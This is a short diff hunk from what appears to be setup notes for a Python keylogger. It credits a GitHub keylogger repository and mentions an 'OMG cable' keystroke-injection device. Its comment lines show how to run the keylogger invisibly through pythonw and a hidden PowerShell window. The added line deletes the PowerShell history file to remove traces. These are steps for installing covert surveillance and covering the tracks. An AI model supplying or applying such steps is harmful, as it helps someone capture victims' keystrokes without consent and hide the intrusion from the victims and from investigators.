@@ -18,6 +18,7 @@ From https://github.com/ncorbuk/Python-Keylogger
 #run powershell >  pythonw "C:\Path\Path\Path\OMG CABLE STUFF\python keylogger test.py"
 
 #powershell -WindowStyle Hidden
+#Remove-Item (Get-PSReadlineOption).HistorySavePath < removes powershell history
 
 # --------------Install python via powershell---------------
 #[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
